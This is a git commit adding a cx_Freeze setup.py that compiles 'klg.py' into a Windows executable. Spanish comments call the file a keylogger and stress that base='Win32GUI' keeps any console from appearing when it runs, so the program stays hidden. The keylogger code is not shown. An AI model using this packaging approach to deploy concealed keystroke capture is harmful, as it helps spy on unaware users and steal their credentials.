32a2c805e807012b16403312e70809b71891d82a
jedahee <56111700+jedahee@users.noreply.github.com>
2020-03-19 03:46:27 +0100

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,7 @@
+import sys
+from cx_Freeze import setup, Executable
+setup(name = "setup",
+      version = "0.1",
+      executables = [Executable("klg.py", base="Win32GUI")])
+#Executable(nombre del archivo keylogger.py)
+#base="Win32GUI" -- MUY IMPORTANTE -- Para que no se ejecute ninguna consola al iniciar el programa
